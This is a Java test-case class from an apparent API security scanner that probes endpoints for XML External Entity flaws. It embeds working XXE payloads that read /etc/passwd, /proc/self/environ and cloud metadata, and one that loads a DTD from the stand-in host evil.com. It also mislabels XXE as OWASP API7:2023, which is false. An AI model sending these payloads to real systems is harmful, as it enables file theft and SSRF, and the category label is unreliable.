package org.owasp.astf.testcases;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.client.methods.HttpPost;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.owasp.astf.core.EndpointInfo;
import org.owasp.astf.core.config.ScanConfig;
import org.owasp.astf.core.http.HttpClient;
import org.owasp.astf.core.http.HttpResponse;
import org.owasp.astf.core.result.Finding;
import org.owasp.astf.core.result.Severity;

/**
 * Tests for API7:2023 - XML External Entity (XXE).
 * 
 * This test case checks for XXE vulnerabilities by sending malicious XML payloads
 * that attempt to read local files or access internal resources through external
 * entity expansion. XXE occurs when XML input containing a reference to an external
 * entity is processed by a weakly configured XML parser, potentially allowing
 * attackers to access internal files, internal network resources, or cause DoS.
 * 
 * @see <a href="https://owasp.org/API-Security/editions/2023/en/0xa7-xml-external-entities/">OWASP API Security Top 10 2023: API7 XML External Entities</a>
 */
public class XXETestCase implements TestCase {
    private static final Logger logger = LogManager.getLogger(XXETestCase.class);

    private ScanConfig config;

    // ✅ XXE payloads для разных сценариев
    private static final List<String> XXE_PAYLOADS = List.of(
        // Classic XXE - файловая система
        """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <data>&xxe;</data>
        """,
        // Classic XXE - Windows
        """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">
        ]>
        <data>&xxe;</data>
        """,
        // Blind XXE - SSRF
        """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
        ]>
        <data>&xxe;</data>
        """,
        // Blind XXE - Internal network
        """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
        ]>
        <data>&xxe;</data>
        """,
        // XXE with parameter entities
        """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
          %xxe;
        ]>
        <data>test</data>
        """,
        // XXE with CDATA
        """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "file:///proc/self/environ">
        ]>
        <data><![CDATA[&xxe;]]></data>
        """,
        // XXE в атрибутах
        """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "file:///etc/hostname">
        ]>
        <request id="&xxe;">test</request>
        """
    );

    // ✅ Подозрительные Content-Type для XXE
    private static final List<String> XXE_CONTENT_TYPES = List.of(
        "application/xml",
        "text/xml", 
        "application/x-www-form-urlencoded", // Может обрабатываться как XML
        "multipart/form-data" // В некоторых случаях может содержать XML
    );

    // ✅ Подозрительные пути для XXE
    private static final List<String> XXE_PATH_PATTERNS = List.of(
        "xml", "import", "export", "upload", "download", "parse", "convert",
        "file", "document", "data", "feed", "rss", "atom", "soap", "wsdl"
    );

    @Override
    public void init(ScanConfig config) {
        this.config = config;
    }

    @Override
    public String getId() {
        return "API7:2023-XXE";
    }

    @Override
    public String getName() {
        return "XML External Entity (XXE) - API7:2023";
    }

    @Override
    public String getDescription() {
        return """
               Tests for XML External Entity vulnerabilities by sending malicious XML payloads
               that attempt to access internal resources or read local files through external
               entity expansion.
               """;
    }

    @Override
    public List<Finding> execute(EndpointInfo endpoint, HttpClient client) throws IOException {
        List<Finding> findings = new ArrayList<>();

        System.out.println("/xml Testing XXE on: " + endpoint.getMethod() + " " + endpoint.getPath());

        // ✅ ПРОВЕРЯЕМ: может ли эндпоинт обрабатывать XML
        if (!isXmlProcessingEndpoint(endpoint)) {
            logger.debug("⏭️ Skipping non-XML endpoint: {}", endpoint.getPath());
            return Collections.emptyList();
        }

        // ✅ ТЕСТИРУЕМ РАЗНЫЕ XXE PAYLOAD
        for (String payload : XXE_PAYLOADS) {
            Finding finding = testXxePayload(endpoint, client, payload);
            if (finding != null) {
                findings.add(finding);
                System.out.println("🚨 XXE VULNERABILITY FOUND: " + endpoint.getPath());
                
                // ✅ ПРЕРЫВАЕМ ПРИ ПЕРВОЙ УЯЗВИМОСТИ (для производительности)
                if (finding.getSeverity() == Severity.CRITICAL) {
                    break;
                }
            }
        }

        if (findings.isEmpty()) {
            System.out.println("✅ XXE protection verified: " + endpoint.getMethod() + " " + endpoint.getPath());
        } else {
            System.out.println("🎯 XXE vulnerabilities found: " + findings.size() + " on " + endpoint.getPath());
        }

        return findings;
    }

    /**
     * ✅ Проверяет, может ли эндпоинт обрабатывать XML
     */
    private boolean isXmlProcessingEndpoint(EndpointInfo endpoint) {
        String path = endpoint.getPath().toLowerCase();
        String method = endpoint.getMethod().toUpperCase();

        // ✅ Только POST/PUT с XML-содержимым
        if (!("POST".equals(method) || "PUT".equals(method) || "PATCH".equals(method))) {
            return false;
        }

        // ✅ Проверяем Content-Type
        if (endpoint.getContentType() != null) {
            String contentType = endpoint.getContentType().toLowerCase();
            for (String xmlType : XXE_CONTENT_TYPES) {
                if (contentType.contains(xmlType)) {
                    logger.debug("🔍 XML endpoint detected: {}", endpoint.getPath());
                    return true;
                }
            }
        }

        // ✅ Проверяем путь на подозрительные паттерны
        for (String pattern : XXE_PATH_PATTERNS) {
            if (path.contains(pattern)) {
                logger.debug("🔍 XML-processing path pattern detected: {}", pattern);
                return true;
            }
        }

        return false;
    }

    /**
     * ✅ Тестирует один XXE payload
     */
    private Finding testXxePayload(EndpointInfo endpoint, HttpClient client, String payload) {
        try {
            // ✅ ИСПОЛЬЗУЕМ XML Content-Type
            Map<String, String> headers = new HashMap<>(config.getHeaders());
            headers.put("Content-Type", "application/xml");

            logger.debug("🧪 Testing XXE payload on: {}", endpoint.getFullUrl());

            // ✅ ВЫПОЛНЯЕМ ЗАПРОС С XXE PAYLOAD
            HttpResponse response = client.post(endpoint.getFullUrl(), headers, payload);

            int statusCode = response.getStatusCode();
            String responseBody = response.getResponseBody(); // ✅ ИСПОЛЬЗУЕМ getResponseBody()
            String responseHeaders = response.getHeaders().toString(); // ✅ ИСПОЛЬЗУЕМ getHeaders()

            // ✅ АНАЛИЗИРУЕМ ОТВЕТ НА ПРИЗНАКИ XXE
            if (isXxeSuccessful(statusCode, responseBody, responseHeaders, payload)) {
                return createXxeFinding(endpoint, payload, statusCode, responseBody);
            }

            // ✅ ПРОВЕРЯЕМ НА BLIND XXE (ошибки, таймауты)
            if (isPossibleBlindXxe(statusCode, responseBody, payload)) {
                return createPotentialXxeFinding(endpoint, payload, statusCode, responseBody);
            }

        } catch (Exception e) {
            logger.debug("XXE test failed for payload on {}: {}", endpoint.getPath(), e.getMessage());
            // Не считаем ошибку за уязвимость
        }

        return null;
    }

    /**
     * ✅ Проверяет, успешна ли XXE атака
     */
    private boolean isXxeSuccessful(int statusCode, String responseBody, String responseHeaders, String payload) {
        if (responseBody == null) {
            return false;
        }

        String lowerResponse = responseBody.toLowerCase();
        String lowerHeaders = responseHeaders.toLowerCase();

        // ✅ ПРИЗНАКИ УСПЕШНОЙ XXE:
        if (statusCode == 200) {
            // Файловая система Linux
            if (lowerResponse.contains("root:") && lowerResponse.contains("bin/bash")) {
                return true; // /etc/passwd
            }

            // Файловая система Windows
            if (lowerResponse.contains("[boot]") && lowerResponse.contains("drivers")) {
                return true; // C:/windows/system32/drivers/etc/hosts
            }

            // Локальное имя хоста
            if (lowerResponse.contains("localhost") || lowerResponse.contains("hostname")) {
                return true;
            }

            // ENV переменные
            if (lowerResponse.contains("proc/self/environ") || lowerResponse.contains("environment")) {
                return true;
            }
        }

        // ✅ ПРИЗНАКИ BLIND XXE (ошибки при обработке XML)
        if (statusCode >= 400 && statusCode < 600) {
            return lowerResponse.contains("xml") && 
                   (lowerResponse.contains("error") || 
                    lowerResponse.contains("parser") || 
                    lowerResponse.contains("entity"));
        }

        return false;
    }

    /**
     * ✅ Проверяет на возможный blind XXE
     */
    private boolean isPossibleBlindXxe(int statusCode, String responseBody, String payload) {
        if (responseBody == null) return false;

        String lowerResponse = responseBody.toLowerCase();

        // ✅ Если есть признаки XML-ошибки - возможна уязвимость
        return statusCode >= 400 && 
               (lowerResponse.contains("xml") && 
                (lowerResponse.contains("entity") || 
                 lowerResponse.contains("parser") || 
                 lowerResponse.contains("external") ||
                 lowerResponse.contains("dtd")));
    }

    /**
     * ✅ Создаёт finding для подтверждённой XXE уязвимости
     */
    private Finding createXxeFinding(EndpointInfo endpoint, String payload, int statusCode, String response) {
        String xxeType = getXxeType(payload);

        return new Finding(
            "XXE-01",
            "XML External Entity (XXE) Vulnerability - " + xxeType + " (API7:2023)",
            "🚨 CRITICAL: XXE vulnerability confirmed!\n\n" +
            "• Endpoint: " + endpoint.getMethod() + " " + endpoint.getPath() + "\n" +
            "• XXE Type: " + xxeType + "\n" +
            "• Payload: " + payload.substring(0, Math.min(100, payload.length())) + "..." + "\n" +
            "• Response Status: " + statusCode + "\n" +
            "• Response Length: " + (response != null ? response.length() : 0) + " chars\n" +
            "• Impact: Attackers can read local files, access internal network, or cause DoS",
            Severity.CRITICAL,
            getId(),
            endpoint.getFullUrl(),
            "✅ CRITICAL REMEDIATION REQUIRED:\n\n" +
            "1. DISABLE EXTERNAL ENTITIES\n" +
            "   • Configure XML parser to disallow external entities\n" +
            "   • Set FEATURE_SECURE_PROCESSING to true\n\n" +
            "2. USE SAFE XML PARSERS\n" +
            "   • Prefer JSON over XML when possible\n" +
            "   • Use XML parsers with XXE protection enabled\n\n" +
            "3. IMPLEMENT XML VALIDATION\n" +
            "   • Use DTD-free XML processing\n" +
            "   • Validate XML schema strictly\n\n" +
            "4. APPLY PRINCIPLE OF LEAST PRIVILEGE\n" +
            "   • Run XML parsing in isolated environment\n" +
            "   • Limit file system and network access for parser processes\n\n" +
            "5. MONITOR XML PROCESSING\n" +
            "   • Log all XML parsing activities\n" +
            "   • Alert on suspicious entity references"
        );
    }

    /**
     * ✅ Создаёт finding для потенциальной XXE уязвимости
     */
    private Finding createPotentialXxeFinding(EndpointInfo endpoint, String payload, int statusCode, String response) {
        String xxeType = getPotentialXxeType(payload);

        return new Finding(
            "XXE-POTENTIAL-02",
            "Potential XML External Entity (XXE) - " + xxeType + " (API7:2023)",
            "⚠️ MEDIUM: Potential XXE vulnerability detected.\n\n" +
            "• Endpoint: " + endpoint.getMethod() + " " + endpoint.getPath() + "\n" +
            "• XXE Type: " + xxeType + "\n" +
            "• Payload: " + payload.substring(0, Math.min(100, payload.length())) + "..." + "\n" +
            "• Response Status: " + statusCode + "\n" +
            "• Error Keywords: " + findXxeErrorKeywords(response) + "\n" +
            "• Risk: XML parser may be vulnerable to external entity expansion",
            Severity.MEDIUM,
            getId(),
            endpoint.getFullUrl(),
            "✅ IMPROVE XML PROCESSING SECURITY:\n\n" +
            "1. REVIEW XML PARSER CONFIGURATION\n" +
            "   • Ensure external entities are disabled\n" +
            "   • Enable XXE protection features\n\n" +
            "2. IMPLEMENT XML VALIDATION\n" +
            "   • Use XML schema validation\n" +
            "   • Strip DTD declarations from input\n\n" +
            "3. CONDUCT MANUAL VERIFICATION\n" +
            "   • Test with real internal file access\n" +
            "   • Verify that XML parsing is properly secured"
        );
    }

    /**
     * ✅ Определяет тип XXE атаки по payload
     */
    private String getXxeType(String payload) {
        if (payload.contains("file://")) {
            return "File System Access";
        } else if (payload.contains("http://")) {
            return "Network Access (SSRF)";
        } else if (payload.contains("%") || payload.contains("SYSTEM")) {
            return "Parameter Entity Expansion";
        } else if (payload.contains("<![CDATA[")) {
            return "CDATA-based XXE";
        } else {
            return "Classic XXE";
        }
    }

    /**
     * ✅ Определяет потенциальный тип XXE
     */
    private String getPotentialXxeType(String payload) {
        if (payload.contains("DOCTYPE") && payload.contains("ENTITY")) {
            return "External Entity Processing";
        } else if (payload.contains("<!ENTITY")) {
            return "Entity Declaration";
        } else {
            return "XML Parser Error";
        }
    }

    /**
     * ✅ Находит ключевые слова ошибок XXE в ответе
     */
    private String findXxeErrorKeywords(String response) {
        if (response == null) return "none";

        List<String> keywords = new ArrayList<>();
        String lower = response.toLowerCase();

        if (lower.contains("xml")) keywords.add("XML");
        if (lower.contains("entity")) keywords.add("Entity");
        if (lower.contains("external")) keywords.add("External");
        if (lower.contains("parser")) keywords.add("Parser");
        if (lower.contains("dtd")) keywords.add("DTD");
        if (lower.contains("file")) keywords.add("File");
        if (lower.contains("network")) keywords.add("Network");

        return String.join(", ", keywords);
    }
}